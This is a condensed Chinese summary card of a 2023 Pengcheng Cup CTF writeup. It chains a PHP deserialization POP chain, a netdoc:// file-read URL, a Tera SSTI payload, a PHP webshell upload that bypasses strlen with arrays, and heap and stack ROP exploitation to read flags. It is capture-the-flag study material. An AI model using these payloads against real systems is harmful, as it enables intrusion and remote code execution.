---
title: "2023 鹏程杯初赛 writeup"
category: web
tags: ["鹏程杯", "web", "PHP反序列化POP链", "nonono正则", "Spring Boot Swagger", "file:///netdoc协议文件包含"]
signals: ["鹏程杯 2023", "PHP反序列化POP链", "nonono正则", "Spring Boot Swagger", "file:///netdoc协议文件包含", "Tera Rust SSTI", "get_env matching", "glob爆破", "数组绕strlen", "ssrf", "deserialize", "rce", "ssti", "PHP"]
difficulty: hard
source: "https://www.ctfiot.com/143076.html"
tools: ["C", "PHP", "ROP", "Rust", "Spring"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2023 鹏程杯初赛 writeup

> 赛事：鹏程杯 2023 | 方向：web | 难度：hard | 工具：C、PHP、ROP、Rust、Spring

## 一句话总结

PHP 反序列化 + Spring Boot Swagger + Tera SSTI + 数组绕 strlen + ORW + babyheap off_by_null + XOR0x23 PE。

## 攻击链

1. PHP 反序列化链 H→welcome→A→C→E→K→R→Hacker.system(cat /flag) → postman /proxy/url?url=netdoc:///flag%23.html → Tera raw data `{% set t="galf"|reverse %}{% set f=get_env(name=t,default="123") %}{% if f is matching('canshu.*') %}aaaaa{% endif %}` 双 ^fla.. 爆破 → glob:// 脚本逐字符爆破 backdoor_xxx → username=admin&title[]=2.php&data[]=<?=`tac /f*` 数组绕 strlen → PWN silent 栈溢出 + magic gadget 改 _IO_2_1_stdout_ 指向 syscall;ret → babyheap off_by_null + unlink 重叠 + environ 栈泄露 + ROP system(/bin/sh) → bad_pe 全文件异或 0x23 → RC4 密钥 th3k3y! 解密

## 关键 payload

```
netdoc:///flag%23.html ; username=admin&title[]=2.php&data[]=<?=`tac%20/f*` ; payload = b"A"*0x48 + p64(csu_1) + ... + p64(leave_ret) ; RC4('th3k3y!') ^ [0xBD, 0xF0, 0x4C, ...]
```

## 经验教训

Tera Rust SSTI 走 get_env 旁路 + 数组绕 strlen 是 web 反复出现的 trick。

## 标签

PHP反序列化POP链、nonono正则、Spring Boot Swagger、file:///netdoc协议文件包含、Tera Rust SSTI、get_env matching、glob爆破、数组绕strlen、ORW沙盒bypass、babyheap off_by_null、unlink重叠、FSOP、environ栈泄露、XOR0x23 PE还原、RC4密钥th3k3y

## 参考来源

- https://www.ctfiot.com/143076.html
- 原文件：2023鹏程杯初赛Writeup.full.md
